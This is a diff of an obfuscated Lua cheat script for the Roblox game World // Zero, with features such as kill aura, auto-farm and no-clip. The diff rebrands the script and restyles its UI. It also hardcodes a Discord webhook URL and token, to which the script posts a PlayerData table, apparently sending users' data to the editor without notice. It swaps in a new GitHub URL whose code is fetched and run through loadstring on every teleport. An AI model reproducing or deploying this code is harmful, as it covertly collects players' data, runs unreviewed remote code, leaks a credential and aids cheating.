@@ -27,8 +27,8 @@ local k = a.ReplicatedStorage;
 local l = a.MarketplaceService;
 local m = a.VirtualInputManager;
 local n = {
-    country = "Hoàng Phi",
-    city = "World // Zero"
+    country = "twist",
+    city = "v5.2"
 }
 a.NetworkClient.ConnectionAccepted:Connect(function(o, p)
     local q = o:sub(1, o:find("|") - 1)
@@ -50,60 +50,81 @@ local r = {
             ["RectOffset"] = Vector2.new(324, 244),
             ["RectSize"] = Vector2.new(36, 36)
         }}
+        
+        -- Tạo ScreenGui và thêm vào CoreGui
         local w = Instance.new("ScreenGui", game.CoreGui)
         local x = Instance.new("ImageLabel", w)
         local y = Instance.new("TextLabel", x)
         local z = Instance.new("ImageLabel", x)
+        
+        -- Thiết lập các thuộc tính của ScreenGui và các phần tử bên trong
         w.Name = "ui" .. tostring(math.random(1, 1000))
+        
         x.Size = UDim2.new(0, 0, 0, 0)
         x.Position = UDim2.new(0.5, 0, 0.75, 0)
         x.Image = "rbxassetid://3570695787"
         x.ImageColor3 = Color3.fromRGB(25, 25, 25)
-        x.BackgroundTransparency = 1;
+        x.BackgroundTransparency = 1
         x.SliceCenter = Rect.new(100, 100, 100, 100)
-        x.ScaleType = Enum.ScaleType.Slice;
-        x.SliceScale = 0.12;
-        y.Font = Enum.Font.LuckiestGuy;
+        x.ScaleType = Enum.ScaleType.Slice
+        x.SliceScale = 0.12
+        
+        y.Font = Enum.Font.LuckiestGuy
         y.TextColor3 = Color3.fromRGB(255, 255, 255)
-        y.TextSize = 20;
+        y.TextSize = 16 -- Kích thước chữ nhỏ hơn
         y.Text = ""
-        y.TextWrapped = true;
-        y.Size = UDim2.new(1, -50, 1, 0)
-        y.Position = UDim2.new(0, 50, 0, 0)
-        y.BackgroundTransparency = 1;
-        z.Size = UDim2.new(0, 50, 0, 50)
+        y.TextWrapped = true
+        y.Size = UDim2.new(1, -30, 1, 0) -- Kích thước nhỏ hơn
+        y.Position = UDim2.new(0, 30, 0, 0)
+        y.BackgroundTransparency = 1
+        
+        z.Size = UDim2.new(0, 30, 0, 30) -- Kích thước nhỏ hơn
         z.ImageColor3 = Color3.fromRGB(38, 255, 0)
-        z.Position = UDim2.new(0, 15, 0.5, -25)
-        z.BackgroundTransparency = 1;
+        z.Position = UDim2.new(0, 10, 0.5, -15) -- Điều chỉnh vị trí theo kích thước mới
+        z.BackgroundTransparency = 1
         z.Image = ""
-        x:TweenSize(UDim2.new(0, 250, 0, 70))
-        x:TweenPosition(UDim2.new(0.5, -125, 0.75, -35))
-        wait(1 / 2)
+        
+        -- Thực hiện Tween để tạo hiệu ứng mở rộng và di chuyển
+        x:TweenSize(UDim2.new(0, 150, 0, 50))
+        x:TweenPosition(UDim2.new(0.5, -75, 0.75, -25))
+        
+        wait(0.5)
+        
         for A, B in pairs(u) do
             z.Image = v[A]["Image"]
             z.ImageRectOffset = v[A]["RectOffset"]
             z.ImageRectSize = v[A]["RectSize"]
+            
             for C = 1, #u[A] do
                 y.Text = string.sub(u[A], 0, C)
                 wait(0.05)
             end
-            wait(1 / 3)
+            
+            wait(0.33)
+            
             for C = 1, #u[A] do
                 y.Text = string.sub(u[A], 0, #u[A] - C)
                 wait(0.05)
             end
+            
             if A ~= #u then
                 wait(0.5)
             end
         end
-        z.Visible = false;
+        
+        z.Visible = false
+        
+        -- Thực hiện Tween để tạo hiệu ứng thu nhỏ và di chuyển về vị trí ban đầu
         x:TweenSize(UDim2.new(0, 0, 0, 0))
         x:TweenPosition(UDim2.new(0.5, 0, 0.75, 0))
-        wait(1 / 4)
+        
+        wait(0.25)
+        
         w:Destroy()
         pcall(t)
     end
 }
+
 pcall(r.createUi, "Twist", function()
 end)
 local D = d.LocalPlayer;
@@ -268,11 +289,11 @@ local al = {KillAura, PetSkill, AutoFarm, GetDrop, NoClip, InfJump, ReLoadOnHop,
             DelEgg, SellNonLegend, AutoSwitch, SellLegend, AiPing, MoLPass, MaxPerk, HPHalf, KlausDown}
 ag('WZ_Toggles', al)
 local am = {
-    Webhook = ''
+    Webhook = 'https://discord.com/api/webhooks/1249664506448187443/2me_mJp4i155tl1fayEFVaYIS-yzp9FNqQAGRyI1v4xe56MYdc8KDYBaA9Yw4Vevl3jw'
 }
 ag('WZwebhook', am)
 local an = syn and syn.queue_on_teleport or fluxus and fluxus.queue_on_teleport or queue_on_teleport;
-local ao = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/HeiKe2022/wz-v5.2/main/combine.lua"))()'
+local ao = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/maihoangphi2531/worldzero/main/test"))()'
 local ap = {
     DungeonID = a0[game.PlaceId],
     DifficultyID = S.GetDifficulty(),
@@ -2350,7 +2371,7 @@ local RepeatRaid = bI:Toggle({
                     H.PlayerGui.TowerFinish.TowerFinish.Description.Overlay:GetPropertyChangedSignal('Text'):Connect(
                         function()
                             if H.PlayerGui.TowerFinish.TowerFinish.Description.Overlay.Text ==
-                                'Collect your rewards! (10)' then
+                                'Collect your rewards! (14)' then
                                 S:SetLeaveChoice(H, true)
                                 S:NotifyReadyToLeave(H)
                             end
@@ -3209,20 +3230,15 @@ local function dG(dH, dI)
         local dL = {
             ["content-type"] = "application/json"
         }
-        request = http_request or request or HttpPost or (syn and syn.request) or syn
-        local response = request({
+        request = http_request or request or HttpPost or syn.request;
+        request({
             Url = dJ,
             Body = dK,
             Method = "POST",
             Headers = dL
         })
-        if response.Success then
-            print("Webhook sent successfully!")
-        else
-            print("Failed to send webhook.")
-        end
     else
-        warn("Invalid webhook URL.")
+        warn("Something went wrong")
     end
 end
 dG(am.Webhook, PlayerData)
